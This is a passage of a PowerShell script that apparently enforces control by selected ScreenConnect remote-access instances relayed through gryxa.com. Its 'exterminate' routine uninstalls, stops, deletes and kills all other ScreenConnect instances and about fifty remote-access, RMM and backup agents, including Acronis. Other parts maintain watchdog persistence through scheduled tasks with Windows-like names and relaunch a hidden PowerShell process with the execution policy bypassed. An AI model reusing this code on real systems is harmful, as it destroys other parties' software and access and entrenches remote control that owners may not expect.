    Log 'exterminate_engine_L7_begin'

    # purge persistence for every non-keeper SC fingerprint BEFORE product/svc/dir removal,
    # so an old/foreign SC watchdog cannot reinstall itself (and cross-kill Gryxa) mid-pass.
    foreach ($fpX in (Get-NonKeeperScFps)) {
        Remove-ScPersistence $fpX
    }

    # 1. foreign SC products from BOTH correct ARP hives
    $seen = @{}
    foreach ($root in $script:UninstallRoots) {
        if (-not (Test-Path $root)) { Log "hive_missing $root"; continue }
        Log "hive_scan $root"
        Get-ChildItem $root -ErrorAction SilentlyContinue | ForEach-Object {
            $prop = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
            $dn = $prop.DisplayName
            if (-not $dn) { return }
            if ($dn -notmatch '(?i)ScreenConnect\s+Client\s*\(([0-9A-Fa-f]{16})\)') { return }
            $fp = $Matches[1].ToLower()
            if ($fp -in $keep) { return }
            $us = $prop.UninstallString
            if ($us -and $us -match '(?i)gryxa\.com') { Log "product_skip_gryxa_relay [$dn]"; return }
            if ($seen.ContainsKey($_.PSChildName)) { return }
            $seen[$_.PSChildName] = $true
            if (Uninstall-ProductKey $_) { $n.product++ } else { $n.fail++; Log "product_REMOVE_FAILED [$dn]" }
        }
    }

    # 2. foreign SC services (skip if keeper FP or relay is gryxa.com)
    foreach ($svc in (Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'ScreenConnect Client*' })) {
        if (Is-Keeper $svc.Name) { continue }
        $img = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$($svc.Name)" -ErrorAction SilentlyContinue).ImagePath
        if (Is-Keeper $img) { Log "svc_skip_gryxa_relay $($svc.Name)"; continue }
        & sc.exe stop "$($svc.Name)" 2>&1 | Out-Null
        Start-Sleep -Milliseconds 600
        & sc.exe delete "$($svc.Name)" 2>&1 | Out-Null
        $n.svc++; Log "svc_deleted $($svc.Name)"
    }

    # 3. foreign SC processes — ONLY if path/cmdline embeds a NON-keeper FP.
    # O41: null ExecutablePath used to kill Gryxa ClientService every tick → reinstall loop.
    Get-CimInstance Win32_Process -Filter "Name like 'ScreenConnect%'" -ErrorAction SilentlyContinue | ForEach-Object {
        $exe = [string]$_.ExecutablePath
        $cmd = [string]$_.CommandLine
        $blob = "$exe $cmd"
        if (Is-Keeper $blob) { return }
        if ($blob -match '(?i)gryxa\.com') { Log "proc_skip_gryxa_relay pid=$($_.ProcessId)"; return }
        if ($blob -notmatch '\(([0-9a-fA-F]{16})\)') {
            Log "proc_skip_no_fp pid=$($_.ProcessId) name=$($_.Name)"
            return
        }
        $fp = $Matches[1].ToLower()
        if ($fp -in $keep) { return }
        Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
        $n.proc++; Log "proc_killed pid=$($_.ProcessId) fp=$fp exe=$exe"
    }

    # 4. foreign SC install dirs (PF + PF86)
    foreach ($base in @($env:ProgramFiles, ${env:ProgramFiles(x86)})) {
        if (-not $base -or -not (Test-Path $base)) { continue }
        Get-ChildItem -LiteralPath $base -Directory -Force -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -like 'ScreenConnect*' } | ForEach-Object {
                $d = $_.FullName
                if (Is-Keeper $d) { return }
                # dir carries no FP/relay in its name; protect the one backing a keeper/gryxa service
                $leaf = $_.Name
                $svcHere = Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'ScreenConnect Client*' } | Where-Object {
                    $im = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$($_.Name)" -ErrorAction SilentlyContinue).ImagePath
                    $im -and ($im -like "*$leaf*")
                }
                if ($svcHere) { Log "dir_skip_live_svc $d"; return }
                if (Force-RemoveDir $d) { $n.dir++; Log "dir_removed $d" }
                else { $n.fail++; Log "dir_REMOVE_FAILED $d" }
            }
    }

    # 5. disallowed RMM / remote-access tools (market coverage 2026).
    # KEEP forever: Datto/CentraStage + ScreenConnect keep FPs (handled above).
    # NEVER put Datto/CentraStage/CagService in this list.
    function Is-DattoKeeper([string]$s) {
        if (-not $s) { return $false }
        return [bool]($s -match '(?i)Datto|CentraStage|CagService|AutotaskEndpoint')
    }
    $rmm = @(
        @{ Tag='AnyDesk';      Svc=@('AnyDesk'); Proc=@('AnyDesk'); Dirs=@("$env:ProgramFiles\AnyDesk","${env:ProgramFiles(x86)}\AnyDesk","$env:ProgramData\AnyDesk"); Prod=@('AnyDesk*') }
        @{ Tag='TeamViewer';   Svc=@('TeamViewer*'); Proc=@('TeamViewer*','tv_w32*','tv_x64*'); Dirs=@("$env:ProgramFiles\TeamViewer","${env:ProgramFiles(x86)}\TeamViewer"); Prod=@('TeamViewer*') }
        @{ Tag='Splashtop';    Svc=@('Splashtop*','SRService','SSUService'); Proc=@('Splashtop*','strwinclt*','SRManager*'); Dirs=@("$env:ProgramFiles\Splashtop","${env:ProgramFiles(x86)}\Splashtop"); Prod=@('Splashtop*') }
        @{ Tag='LogMeIn';      Svc=@('LogMeIn','LMIGuardianSvc','LMIignition'); Proc=@('LogMeIn*','LMIGuardian*','RaServer*'); Dirs=@("$env:ProgramFiles\LogMeIn","${env:ProgramFiles(x86)}\LogMeIn"); Prod=@('LogMeIn*') }
        @{ Tag='GoTo';         Svc=@('GoToMyPC*','GoToAssist*','GoToResolve*'); Proc=@('GoToMyPC*','GoToAssist*','g2m*','GoToResolve*'); Dirs=@("$env:ProgramFiles\GoToMyPC","${env:ProgramFiles(x86)}\GoToMyPC"); Prod=@('GoToMyPC*','GoToAssist*','GoTo Resolve*','GoToMeeting*','GoTo Connect*') }
        @{ Tag='RustDesk';     Svc=@('RustDesk','rustdesk*'); Proc=@('rustdesk*'); Dirs=@("$env:ProgramFiles\RustDesk","${env:ProgramFiles(x86)}\RustDesk"); Prod=@('RustDesk*') }
        @{ Tag='Supremo';      Svc=@('Supremo*'); Proc=@('Supremo*'); Dirs=@("$env:ProgramFiles\Supremo","${env:ProgramFiles(x86)}\Supremo"); Prod=@('Supremo*') }
        @{ Tag='DWService';    Svc=@('DWAgent','dwagent*'); Proc=@('dwagent*'); Dirs=@("$env:ProgramFiles\DWAgent","${env:ProgramFiles(x86)}\DWAgent","$env:ProgramData\DWAgent"); Prod=@('DWAgent*','DWService*') }
        @{ Tag='ZohoAssist';   Svc=@('ZohoAssist*','ZohoMeeting*'); Proc=@('ZohoAssist*','ZohoURSB*'); Dirs=@("$env:ProgramFiles\ZohoMeeting","${env:ProgramFiles(x86)}\ZohoMeeting"); Prod=@('Zoho Assist*','ZohoMeeting*') }
        @{ Tag='RemotePC';     Svc=@('RemotePC*'); Proc=@('RemotePC*','RPCSuite*'); Dirs=@("$env:ProgramFiles\RemotePC","${env:ProgramFiles(x86)}\RemotePC"); Prod=@('RemotePC*') }
        @{ Tag='Bomgar';       Svc=@('bomgar*','BeyondTrust*'); Proc=@('bomgar*'); Dirs=@("$env:ProgramFiles\Bomgar","${env:ProgramFiles(x86)}\Bomgar","$env:ProgramFiles\BeyondTrust","${env:ProgramFiles(x86)}\BeyondTrust"); Prod=@('Bomgar*','BeyondTrust*') }
        @{ Tag='Parsec';       Svc=@('Parsec*'); Proc=@('parsecd*','pservice*'); Dirs=@("$env:ProgramFiles\Parsec","${env:ProgramFiles(x86)}\Parsec","$env:ProgramData\Parsec"); Prod=@('Parsec*') }
        @{ Tag='ChromeRD';     Svc=@('chromoting*'); Proc=@('remoting_host*'); Dirs=@("$env:ProgramFiles\Google\Chrome Remote Desktop","${env:ProgramFiles(x86)}\Google\Chrome Remote Desktop"); Prod=@('Chrome Remote Desktop*') }
        @{ Tag='UltraVNC';     Svc=@('uvnc*','winvnc*'); Proc=@('winvnc*','uvnc*'); Dirs=@("$env:ProgramFiles\UltraVNC","${env:ProgramFiles(x86)}\UltraVNC"); Prod=@('UltraVNC*','WinVNC*') }
        @{ Tag='TightVNC';     Svc=@('tvnserver*'); Proc=@('tvnserver*','tvnviewer*'); Dirs=@("$env:ProgramFiles\TightVNC","${env:ProgramFiles(x86)}\TightVNC"); Prod=@('TightVNC*') }
        @{ Tag='RealVNC';      Svc=@('vncserver*'); Proc=@('vncserver*','vncviewer*'); Dirs=@("$env:ProgramFiles\RealVNC","${env:ProgramFiles(x86)}\RealVNC"); Prod=@('VNC Server*','RealVNC*') }
        @{ Tag='DameWare';     Svc=@('DameWare*'); Proc=@('DWRCS*','DWRCC*','DameWare*'); Dirs=@("$env:ProgramFiles\SolarWinds","${env:ProgramFiles(x86)}\SolarWinds","$env:ProgramFiles\DameWare Remote Support","${env:ProgramFiles(x86)}\DameWare Remote Support"); Prod=@('DameWare*') }
        @{ Tag='NetSupport';   Svc=@('NetSupport*'); Proc=@('client32*','pcictl*'); Dirs=@("$env:ProgramFiles\NetSupport","${env:ProgramFiles(x86)}\NetSupport"); Prod=@('NetSupport*') }
        @{ Tag='SimpleHelp';   Svc=@('SimpleHelp*'); Proc=@('SimpleService*','simpleservice*'); Dirs=@("$env:ProgramFiles\SimpleHelp","${env:ProgramFiles(x86)}\SimpleHelp"); Prod=@('SimpleHelp*') }
        @{ Tag='GetScreen';    Svc=@('GetScreen*'); Proc=@('GetScreen*'); Dirs=@("$env:ProgramFiles\GetScreen","${env:ProgramFiles(x86)}\GetScreen"); Prod=@('GetScreen*') }
        @{ Tag='Iperius';      Svc=@('Iperius*'); Proc=@('IperiusRemote*'); Dirs=@("$env:ProgramFiles\Iperius Remote","${env:ProgramFiles(x86)}\Iperius Remote"); Prod=@('Iperius*') }
        @{ Tag='ISLOnline';   Svc=@('ISLlight*'); Proc=@('ISLlight*','ISLAlwaysOn*'); Dirs=@("$env:ProgramFiles\ISL Online","${env:ProgramFiles(x86)}\ISL Online"); Prod=@('ISL Light*','ISL AlwaysOn*') }
        @{ Tag='Ammyy';        Svc=@('Ammyy*'); Proc=@('Ammyy*'); Dirs=@("$env:ProgramFiles\Ammyy","${env:ProgramFiles(x86)}\Ammyy"); Prod=@('Ammyy*') }
        @{ Tag='UltraViewer';  Svc=@('UltraViewer*'); Proc=@('UltraViewer*'); Dirs=@("$env:ProgramFiles\UltraViewer","${env:ProgramFiles(x86)}\UltraViewer"); Prod=@('UltraViewer*') }
        @{ Tag='AeroAdmin';    Svc=@('AeroAdmin*'); Proc=@('AeroAdmin*'); Dirs=@("$env:ProgramFiles\AeroAdmin","${env:ProgramFiles(x86)}\AeroAdmin"); Prod=@('AeroAdmin*') }
        @{ Tag='LiteManager';  Svc=@('LiteManager*'); Proc=@('ROMServer*','ROMViewer*'); Dirs=@("$env:ProgramFiles\LiteManager","${env:ProgramFiles(x86)}\LiteManager"); Prod=@('LiteManager*') }
        @{ Tag='Radmin';       Svc=@('Radmin*'); Proc=@('rserver3*','Radmin*'); Dirs=@("$env:ProgramFiles\Radmin Server 3","${env:ProgramFiles(x86)}\Radmin Server 3"); Prod=@('Radmin*') }
        @{ Tag='NoMachine';    Svc=@('nxserver*','nxd*'); Proc=@('nxd*','nxserver*','nxrunner*'); Dirs=@("$env:ProgramFiles\NoMachine","${env:ProgramFiles(x86)}\NoMachine"); Prod=@('NoMachine*') }
        @{ Tag='NinjaOne';     Svc=@('NinjaRMMAgent','ninjarmm*','NinjaRMM*'); Proc=@('NinjaRMMAgent*','ninjarmm*'); Dirs=@("$env:ProgramFiles\NinjaRMMAgent","${env:ProgramFiles(x86)}\NinjaRMMAgent","$env:ProgramData\NinjaRMMAgent","$env:ProgramFiles\NinjaOne","${env:ProgramFiles(x86)}\NinjaOne"); Prod=@('NinjaRMM*','NinjaOne*') }
        @{ Tag='Atera';        Svc=@('AteraAgent'); Proc=@('AteraAgent*'); Dirs=@("$env:ProgramFiles\ATERA Networks","${env:ProgramFiles(x86)}\ATERA Networks","$env:ProgramData\ATERA Networks"); Prod=@('Atera*') }
        @{ Tag='ConnectWise';  Svc=@('LTService','LTSvcMon'); Proc=@('LTSvc*','LTTray*'); Dirs=@("$env:windir\LTSvc","$env:ProgramFiles\LabTech Client","${env:ProgramFiles(x86)}\LabTech Client"); Prod=@('ConnectWise Automate*','ConnectWise RMM*','LabTech*') }
        @{ Tag='Kaseya';       Svc=@('AgentMon','Kaseya*','KAADS*'); Proc=@('AgentMon*','Kaseya*'); Dirs=@("$env:ProgramFiles\Kaseya","${env:ProgramFiles(x86)}\Kaseya"); Prod=@('Kaseya VSA*','Kaseya Agent*') }
        @{ Tag='Nable';        Svc=@('Advanced Monitoring Agent*','N-able*','NCentral*'); Proc=@('FileSystemAgent*','NCentral*'); Dirs=@("$env:ProgramFiles\Advanced Monitoring Agent","${env:ProgramFiles(x86)}\Advanced Monitoring Agent","$env:ProgramFiles\N-able Technologies","${env:ProgramFiles(x86)}\N-able Technologies","$env:ProgramFiles\MSPA Files","${env:ProgramFiles(x86)}\MSPA Files"); Prod=@('Advanced Monitoring Agent*','N-able*','N-central*','N-sight*','Take Control*','SolarWinds MSP*') }
        @{ Tag='Syncro';       Svc=@('Syncro*','Kabuto*'); Proc=@('Syncro*','Kabuto*'); Dirs=@("$env:ProgramFiles\RepairTech","${env:ProgramFiles(x86)}\RepairTech","$env:ProgramFiles\Syncro","${env:ProgramFiles(x86)}\Syncro","$env:ProgramData\Syncro"); Prod=@('Syncro*','Kabuto*','RepairTech*') }
        @{ Tag='Pulseway';     Svc=@('Pulseway*','PC Monitor*'); Proc=@('PCMonitorMgr*','PCMonitorManager*','Pulseway*'); Dirs=@("$env:ProgramFiles\Pulseway","${env:ProgramFiles(x86)}\Pulseway","$env:ProgramFiles\PC Monitor","${env:ProgramFiles(x86)}\PC Monitor"); Prod=@('Pulseway*','PC Monitor*') }
        @{ Tag='SuperOps';     Svc=@('SuperOps*'); Proc=@('SuperOps*'); Dirs=@("$env:ProgramFiles\SuperOps","${env:ProgramFiles(x86)}\SuperOps","$env:ProgramData\SuperOps"); Prod=@('SuperOps*') }
        @{ Tag='Level';        Svc=@('Level*'); Proc=@('level*'); Dirs=@("$env:ProgramFiles\Level","${env:ProgramFiles(x86)}\Level","$env:ProgramData\Level"); Prod=@('Level*') }
        @{ Tag='Action1';      Svc=@('Action1*'); Proc=@('Action1*','action1_agent*'); Dirs=@("$env:ProgramFiles\Action1","${env:ProgramFiles(x86)}\Action1","$env:ProgramData\Action1"); Prod=@('Action1*') }
        @{ Tag='ManageEngine'; Svc=@('ManageEngine*','UEMS*','DCAgent*'); Proc=@('ManageEngine*','dcagent*','UEMS*'); Dirs=@("$env:ProgramFiles\ManageEngine","${env:ProgramFiles(x86)}\ManageEngine"); Prod=@('ManageEngine*','UEMS*','Desktop Central*','Endpoint Central*','RMM Central*') }
        @{ Tag='TacticalRMM';  Svc=@('tacticalrmm*','Mesh Agent','MeshAgent'); Proc=@('tacticalrmm*','meshagent*','MeshAgent*'); Dirs=@("$env:ProgramFiles\TacticalAgent","${env:ProgramFiles(x86)}\TacticalAgent","$env:ProgramFiles\Mesh Agent","${env:ProgramFiles(x86)}\Mesh Agent"); Prod=@('Tactical*','Mesh Agent*','MeshCentral*') }
        @{ Tag='MeshCentral';  Svc=@('Mesh Agent','MeshAgent','MeshCentral*'); Proc=@('MeshAgent*','MeshCentral*'); Dirs=@("$env:ProgramFiles\Mesh Agent","${env:ProgramFiles(x86)}\Mesh Agent"); Prod=@('Mesh*Agent*','MeshCentral*') }
        @{ Tag='Continuum';    Svc=@('SAAZ*','Continuum*'); Proc=@('SAAZ*','Continuum*'); Dirs=@("$env:ProgramFiles\SAAZOD","${env:ProgramFiles(x86)}\SAAZOD","$env:ProgramFiles\Continuum","${env:ProgramFiles(x86)}\Continuum"); Prod=@('Continuum*','SAAZ*') }
        @{ Tag='Naverisk';     Svc=@('Naverisk*'); Proc=@('Naverisk*'); Dirs=@("$env:ProgramFiles\Naverisk","${env:ProgramFiles(x86)}\Naverisk"); Prod=@('Naverisk*') }
        @{ Tag='ImmyBot';      Svc=@('ImmyBot*','Immy*'); Proc=@('ImmyAgent*','ImmyBot*'); Dirs=@("$env:ProgramFiles\ImmyBot","${env:ProgramFiles(x86)}\ImmyBot","$env:ProgramData\ImmyBot"); Prod=@('ImmyBot*') }
        @{ Tag='Automox';      Svc=@('amagent*','Automox*'); Proc=@('amagent*'); Dirs=@("$env:ProgramFiles\Automox","${env:ProgramFiles(x86)}\Automox","$env:ProgramData\amagent"); Prod=@('Automox*') }
        @{ Tag='AcronisCyber'; Svc=@('Acronis*'); Proc=@('acrocmd*'); Dirs=@("$env:ProgramFiles\Acronis","${env:ProgramFiles(x86)}\Acronis"); Prod=@('Acronis Cyber*','Acronis Agent*','Cyber Protect Agent*') }
        @{ Tag='Domotz';       Svc=@('Domotz*'); Proc=@('Domotz*'); Dirs=@("$env:ProgramFiles\Domotz","${env:ProgramFiles(x86)}\Domotz"); Prod=@('Domotz*') }
        @{ Tag='Auvik';        Svc=@('Auvik*'); Proc=@('Auvik*'); Dirs=@("$env:ProgramFiles\Auvik","${env:ProgramFiles(x86)}\Auvik"); Prod=@('Auvik*') }
        @{ Tag='BarracudaRMM'; Svc=@('Barracuda*'); Proc=@('MWService*'); Dirs=@("$env:ProgramFiles\Barracuda","${env:ProgramFiles(x86)}\Barracuda","$env:ProgramFiles\Level Platforms","${env:ProgramFiles(x86)}\Level Platforms"); Prod=@('Barracuda RMM*','Managed Workplace*') }
        @{ Tag='Goverlan';     Svc=@('Goverlan*'); Proc=@('goverlan*','govagent*'); Dirs=@("$env:ProgramFiles\Goverlan","${env:ProgramFiles(x86)}\Goverlan"); Prod=@('Goverlan*') }
        @{ Tag='PDQ';          Svc=@('PDQ*'); Proc=@('PDQRunner*','PDQInventory*','PDQDeploy*'); Dirs=@("$env:ProgramFiles\Admin Arsenal","${env:ProgramFiles(x86)}\Admin Arsenal","$env:ProgramFiles\PDQ","${env:ProgramFiles(x86)}\PDQ"); Prod=@('PDQ Deploy*','PDQ Inventory*','PDQ Connect*') }
    )

    foreach ($tool in $rmm) {
        $hit = $false
        foreach ($pat in $tool.Prod) {
            foreach ($root in $script:UninstallRoots) {
                Get-ChildItem $root -ErrorAction SilentlyContinue | ForEach-Object {
                    $dn = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).DisplayName
                    if ($dn -and $dn -like $pat) {
                        if (Is-DattoKeeper $dn) { Log "rmm_skip_datto_keep [$dn]"; return }
                        if (Uninstall-ProductKey $_) { $n.rmm++; $hit = $true }
                    }
                }
            }
        }
        foreach ($pat in $tool.Svc) {
            Get-Service -Name $pat -ErrorAction SilentlyContinue | ForEach-Object {
                if (Is-DattoKeeper $_.Name -or Is-DattoKeeper $_.DisplayName) { Log "rmm_skip_datto_svc $($_.Name)"; return }
                & sc.exe stop "$($_.Name)" 2>&1 | Out-Null
                Start-Sleep -Milliseconds 500
                & sc.exe delete "$($_.Name)" 2>&1 | Out-Null
                $n.rmm++; $hit = $true; Log "rmm_svc_deleted $($_.Name) [$($tool.Tag)]"
            }
        }
        foreach ($pat in $tool.Proc) {
            Get-Process -Name $pat -ErrorAction SilentlyContinue | ForEach-Object {
                Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
                $n.rmm++; $hit = $true; Log "rmm_proc_killed $($_.ProcessName) [$($tool.Tag)]"
            }
        }
        foreach ($d in $tool.Dirs) {
            if ($d -and (Test-Path -LiteralPath $d)) {
                if (Is-DattoKeeper $d) { Log "rmm_skip_datto_dir $d"; continue }
                if (Force-RemoveDir $d) { $n.rmm++; $hit = $true; Log "rmm_dir_removed $d" }
                else { $n.fail++; Log "rmm_dir_REMOVE_FAILED $d" }
            }
        }
        if ($hit) { Log "rmm_exterminated $($tool.Tag)" }
    }

    $summary = "exterminate svc=$($n.svc) proc=$($n.proc) dir=$($n.dir) product=$($n.product) rmm=$($n.rmm) fail=$($n.fail)"
    Log $summary
    return $summary
}

function Update-State {
    $keep = @(Get-KeepFingerprints)
    $gryxaFp = Get-GryxaFp
    $sevrz = @(Get-SevrzKeep)
    $primFp = $sevrz[0]; $altFp = $sevrz[1]
    $prim = $null; $alt = $null; $script:gryxa = $null
    foreach ($svc in (Get-Service -Name 'ScreenConnect Client*')) {
        if ($svc.Name -match '\(([0-9a-f]{16})\)') {
            $fp = $matches[1].ToLower()
            if ($fp -eq $primFp) { $prim = "$($svc.Status)" }
            elseif ($fp -eq $altFp) { $alt = "$($svc.Status)" }
            elseif ($fp -eq $gryxaFp -or (Test-IsGryxaFp $fp)) { $script:gryxa = "$($svc.Status)" }
        }
    }
    $foreign = @()
    foreach ($svc in (Get-Service -Name 'ScreenConnect Client*')) {
        if ($svc.Name -match '\(([0-9a-f]{16})\)' -and $matches[1] -notin $keep) {
            $foreign += $matches[1]
        }
    }
    $id = Read-Identity
    $tasksOk = 0; $tasksTotal = 0
    foreach ($k in 'TASK_A','TASK_B','TASK_C','TASK_D') {
        $tasksTotal++
        $tn = Normalize-TaskName ([string]$id[$k])
        if (-not $tn) { continue }
        $marker = if ($k -eq 'TASK_B') { 'etl_mon.cmd' } else { 'own_mon.cmd' }
        if ((Test-TaskOwnsMon $tn $marker) -or (Test-TaskOwnsMon ("\$tn") $marker)) { $tasksOk++ }
    }
    # L39: count WucacheGryxaBoot (TASK_G)
    $tasksTotal++
    $tgName = 'WucacheGryxaBoot'
    if ((Get-ScheduledTask -TaskName $tgName -ErrorAction SilentlyContinue) -or
        (Test-Path -LiteralPath (Join-Path $WorkDir 'gryxa_boot.cmd'))) {
        $tasksOk++
    }
    if (-not $MonPath) { $MonPath = Join-Path $WorkDir 'own_mon.cmd' }
    $wd = Ensure-Watchdog
    $prev = @{}
    $statePath = Join-Path $WorkDir 'state.json'
    if (Test-Path $statePath) {
        try { (Get-Content -LiteralPath $statePath -Raw | ConvertFrom-Json).PSObject.Properties | ForEach-Object { $prev[$_.Name] = $_.Value } } catch {}
    }
    $installCount = 1
    if ($prev.installCount) { $installCount = [int]$prev.installCount }
    if ($prev.prim -and $prev.prim -ne 'Running' -and $prim -eq 'Running') { $installCount++ }
    $state = [ordered]@{
        host         = $env:COMPUTERNAME
        ts           = (Get-Date).ToUniversalTime().ToString('o')
        build        = $Build
        prim         = $(if ($prim) { $prim } else { 'MISSING' })
        alt          = $(if ($alt) { $alt } else { 'MISSING' })
        gryxa        = $(if ($script:gryxa) { $script:gryxa } else { 'MISSING' })
        gryxaFp      = $gryxaFp
        foreign      = $foreign
        tasksOk      = $tasksOk
        tasksTotal   = $tasksTotal
        watchdog     = $wd
        installCount = $installCount
        lastHeal     = $(if ($Extra) { (Get-Date).ToUniversalTime().ToString('o') } elseif ($prev.lastHeal) { $prev.lastHeal } else { $null })
        note         = $Extra
    }
    ($state | ConvertTo-Json -Compress) | Set-Content -LiteralPath $statePath -Force
    return $state
}

switch ($Action) {
    'init'            { $id = Initialize-Identity; $id.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" } }
    'identity'        { $id = Read-Identity; $id.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" } }
    'watchdog'        { Install-Watchdog | Out-Null }
    'watchdog-ensure' { Ensure-Watchdog }
    'tasks-ensure'    { Ensure-PersistTasks }
    'state'           { Update-State | ConvertTo-Json -Compress }
    'repair'          { Repair-SCService $Fp }
    'registered'      { Test-SCRegistered $Fp }
    'exterminate'     { Invoke-Exterminate }
    'gryxa-health'    { Test-GryxaHealth }
    'sync-gryxa-fp'   {
        $g = Find-RunningGryxaFp
        if ($g) {
            Set-GryxaFp $g
            Write-Output "SYNCED|$g"
        } else {
            $cur = Get-GryxaFp
            if (-not (Test-IsGryxaFp $cur) -and $script:GryxaExpectedFp) {
                Set-GryxaFp $script:GryxaExpectedFp
                Write-Output "RESET|$($script:GryxaExpectedFp)"
            } else {
                Write-Output "NONE|$cur"
            }
        }
    }
    'test-msi'        {
        $path = $Extra
        if (-not $path) { Write-Output 'no'; break }
        if (Test-MsiPackage $path $Fp) { Write-Output 'yes' } else { Write-Output 'no' }
    }
    'protect-msi'     {
        $safe = Protect-MsiSiblingSafe $Extra
        if ($safe) { Write-Output $safe } else { Write-Output 'FAIL' }
    }
    'verify-update'   {
        # Extra = "manifest|sig|name=path;name2=path2"
        $parts = $Extra -split '\|', 3
        if ($parts.Count -lt 3) { Write-Output 'bad-args'; break }
        $map = @{}
        foreach ($pair in ($parts[2] -split ';')) {
            if ($pair -match '^([^=]+)=(.*)$') { $map[$matches[1]] = $matches[2] }
        }
        Write-Output (Test-UpdateManifest $parts[0] $parts[1] $map)
    }
    'sync-sevrz-fp'   {
        if ($Extra) { Write-Output (Sync-SevrzExpected $Extra) }
        else {
            $k = @(Get-SevrzKeep)
            Write-Output ("SEVRZ|$($k[0])|$($k[1])")
        }
    }
    'gryxa-ensure'    {
        if ($NoWait) {
            # L35/L39: pass ArgumentList as string array (joined string is a Start-Process footgun)
            $ps = (Get-Process -Id $PID).Path
            if (-not $ps) { $ps = 'powershell.exe' }
            $argList = @(
                '-NoProfile', '-ExecutionPolicy', 'Bypass',
                '-File', $PSCommandPath,
                '-Action', 'gryxa-ensure',
                '-WorkDir', $WorkDir,
                '-Build', $Build
            )
            if ($Deep)  { $argList += '-Deep' }
            if ($Force) { $argList += '-Force' }
            Start-Process -FilePath $ps -ArgumentList $argList -WindowStyle Hidden
            Write-Output 'QUEUED|detached=1'
        } else {
            Write-Output (Invoke-GryxaEnsure | Out-String).Trim()
        }
    }
}
